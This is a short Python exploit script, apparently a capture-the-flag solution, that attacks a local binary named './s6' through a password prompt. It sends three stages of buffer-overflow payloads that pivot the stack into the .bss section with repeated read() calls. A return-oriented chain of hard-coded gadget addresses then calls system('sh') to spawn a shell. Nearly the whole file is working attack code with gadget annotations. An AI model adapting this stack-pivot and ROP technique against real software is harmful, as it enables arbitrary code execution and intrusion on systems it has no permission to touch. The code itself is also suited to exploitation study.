#!/usr/bin/env python
# -*- coding: utf-8 -*-

import binexpect
import struct

# 0x4006d1 : leave; ret
# 0x400743 : pop rdi; ret
# 0x400670 : read(0, rbp-0x20, 0x400); [...];leave; ret
# 0x400686 : read(); [...]; leave; ret
# 0x4006c7 : system()

# 0x600ff8 : .got /!\
# 0x601000 : .got.plt /!\
# 0x601050 : .data
# 0x601060 : .bss

if __name__ == "__main__":
    setup = binexpect.setup('./s6')
    target = setup.target()
    target.setecho(False)

    base = 0x601520 # stack

    # STAGE1:
    # pivot stack with call to read
    payload = b'A' * 0x20
    payload += struct.pack('L', base - 0x30)    # new stack base
    payload += struct.pack('L', 0x400670)       # read(0, rbp-0x20, 0x30); [...];leave; ret
                                                # pivot here from main.
    target.tryexpect('What is your password?')
    target.sendbin(payload)

    # STAGE2:
    payload = b'A' * 0x20

    payload += struct.pack('L', base)           # SF for system
    payload += struct.pack('L', 0x400670)       # read

    target.sendbin(payload)

    # STAGE3:
    payload =  struct.pack('L', 0x400743)       # pop rdi; ret
    payload += struct.pack('L', base - 0x08)    # @sh
    payload += struct.pack('L', 0x4006c7)       # system()
    payload += b'sh'.ljust(0x8, b'\x00')        # 'sh'

    payload += struct.pack('L', base - 0x28)    # SF
    payload += struct.pack('L', 0x4006d1)       # pivot stack again

    target.sendbin(payload)
    target.sendeof()

    target.tryexpect("If you're cool you'll get a shell.")
    target.pwned()
